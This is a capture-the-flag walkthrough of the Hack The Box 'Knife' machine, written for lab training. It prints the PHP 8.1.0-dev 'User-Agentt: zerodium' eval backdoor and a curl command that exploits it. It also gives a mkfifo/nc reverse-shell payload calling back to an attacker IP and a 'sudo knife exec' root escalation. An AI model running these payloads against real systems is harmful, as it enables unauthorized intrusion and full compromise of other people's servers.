# Hack The Box: Knife

**Difficulty:** Easy
**OS:** Linux

Knife is an Easy-level Linux machine designed to demonstrate the exploitation of a supply chain attack involving a backdoored version of PHP. The initial compromise requires identifying the specific PHP version running the web server and exploiting a hidden HTTP header that evaluates PHP code. Privilege escalation involves exploiting a misconfigured `sudo` permission on the `knife` utility, allowing an attacker to execute arbitrary ruby commands as root.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.242
nmap -p 22,80 -sCV 10.10.10.242
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.41)

Navigating to the web service on port 80 displays a landing page for "Emergent Medical Idea." The website is a single static HTML page with generic content. We check the HTTP response headers using `curl` to gather more information about the underlying technology stack.

```bash
curl -I http://10.10.10.242
```

The response headers reveal a critical piece of information:

```text
HTTP/1.1 200 OK
Date: ...
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Connection: close
Content-Type: text/html; charset=UTF-8
```

## Web Exploitation

The `X-Powered-By` header indicates the server is running `PHP/8.1.0-dev`.

### Exploiting PHP 8.1.0-dev Backdoor

In March 2021, the official PHP Git repository was compromised in a supply chain attack. Malicious commits were pushed to the `php-src` repository, specifically targeting the development branch of PHP 8.1.

The attackers introduced a backdoor into the `zlib` extension. If an HTTP request contained a specific header named `User-Agentt` (note the double 't') beginning with the string `zerodium`, the code following that string would be executed as PHP via the `eval()` function.

```php
// The backdoored code snippet in PHP 8.1.0-dev
if (isset($_SERVER['HTTP_USER_AGENTT']) && strpos($_SERVER['HTTP_USER_AGENTT'], 'zerodium') === 0) {
    eval(substr($_SERVER['HTTP_USER_AGENTT'], 8));
}
```

We can exploit this backdoor to execute arbitrary commands on the server. We use `curl` to send an HTTP GET request with the malicious `User-Agentt` header.

```bash
curl -H "User-Agentt: zerodium system('id');" http://10.10.10.242
```

The server responds with the output of the `id` command, confirming remote code execution.

```text
uid=1000(james) gid=1000(james) groups=1000(james)
```

We have gained initial access as the `james` user.

## Initial Access

To gain a more interactive shell, we craft a payload that establishes a reverse TCP connection back to our attacking machine. We must properly encode or escape the payload to ensure the PHP `system()` function executes it correctly.

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We send the reverse shell payload via the vulnerable HTTP header.

```bash
curl -H "User-Agentt: zerodium system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 9999 >/tmp/f');" http://10.10.10.242
```

The server processes the request, and we receive a reverse shell connection. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

We retrieve the `user.txt` flag from the `james` user's home directory.

## Privilege Escalation

Enumerating the system as `james`, we check for commands the user can run using `sudo`.

```bash
sudo -l
```

The output reveals that the user can run the `knife` command as `root` without a password.

```text
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

### Abusing Sudo & knife

The `knife` utility is a command-line tool used to interact with Chef servers, managing infrastructure configurations. Chef uses Ruby for its configurations, and `knife` relies heavily on Ruby environments.

Because we can execute `knife` via `sudo`, we can look for ways to leverage it to execute arbitrary commands as root. The `knife` utility includes an `exec` subcommand, which is designed to execute Ruby scripts within the context of the Chef environment.

We can abuse the `knife exec` command to execute arbitrary Ruby code directly from the command line. We pass a Ruby payload to spawn a root shell.

```bash
sudo knife exec -E 'exec "/bin/sh"'
```

The `-E` flag tells `knife exec` to evaluate the following string as Ruby code. The `exec "/bin/sh"` command replaces the current `knife` process with an interactive shell. Because the process was started with `sudo`, the new shell runs as root.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
